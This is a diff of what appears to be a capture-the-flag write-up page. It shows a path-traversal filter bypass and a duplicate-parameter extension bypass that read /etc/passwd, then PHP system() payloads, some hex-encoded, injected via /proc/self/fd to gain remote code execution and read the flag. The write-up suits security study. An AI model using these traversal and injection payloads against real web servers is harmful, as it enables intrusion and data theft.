@@ -67,37 +67,31 @@
 <p>Trying to reach a file with an extension other than <code>.txt</code> results in an error. However, appending an extra <code>f</code> parameters after one with the <code>.txt</code> extension lets me bypass the extension check and access the content of the last file.</p>
 <p>The txt files are inside a <code>files/</code> folder and there seem to be some sort of sanitization mechanism, since <code>../</code> get stripped away. However, the filter applies only to that specific pattern, so <code>....//</code> becomes <code>../</code> after sanitation and allows me to look up into the parent folder.</p>
 <p>Combining the two bypasses together gets me the <code>etc/passwd</code> file:</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//etc/passwd`</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//etc/passwd`
 </code></pre></div>
-
 
 <p>The flag doesn't seem to be there though.</p>
 <p>Let's see if it is possible to turn this LFI into an RCE, since trying to guess name and location of the flag doesn't sound like a realistic strategy.</p>
 <p>By examining the <code>proc/self/fd</code> folder I discover that <code>proc/self/fd/11</code> stores the serialized parameters of the search request. Let's see if we can write by making a POST request containing <code>&lt;?php system('id'); ?&gt;</code></p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;submit=submit</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/search=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E&amp;submit=submit
 </code></pre></div>
-
 
 <p>and check the proc file again</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//proc/self/fd/11</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/lookup.php?f=flag.txt&amp;f=....//....//....//....//proc/self/fd/11
 </code></pre></div>
-
 
 <p>Yeah! The code gets executed and the result gets saved into it!!</p>
 <p>Let's run <code>ls /</code></p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;submit=submit</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/search=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E&amp;submit=submit
 </code></pre></div>
-
 
 <p>and check the outcome in the proc file. No flag in the root folder, but <code>home/ctf_user1</code> seems interesting:</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;submit=submit</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%6c%73%20%2d%61%6c%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%27%29%3b%20%3f%3e&amp;submit=submit
 </code></pre></div>
-
 
 <p>there's the flag - let's cat it!</p>
-<div class="highlight"><pre><span></span><code><span class="c">http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;submit=submit</span>
+<div class="highlight"><pre><span></span><code>http://5.150.254.85:8082/search=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%61%74%20%2f%68%6f%6d%65%2f%63%74%66%5f%75%73%65%72%31%2f%2e%33%33%36%64%35%65%62%63%35%34%33%36%35%33%34%65%36%31%64%31%36%65%36%33%64%64%66%63%61%33%32%37%5f%66%6c%61%67%31%2e%74%78%74%27%29%3b%20%3f%3e&amp;submit=submit
 </code></pre></div>
-
 
 <p>Success! <code>FLAG_c4a66ead822b8d2dd42da826eb180371</code></p>
             <a href="#" class="go-top">Go Top</a>
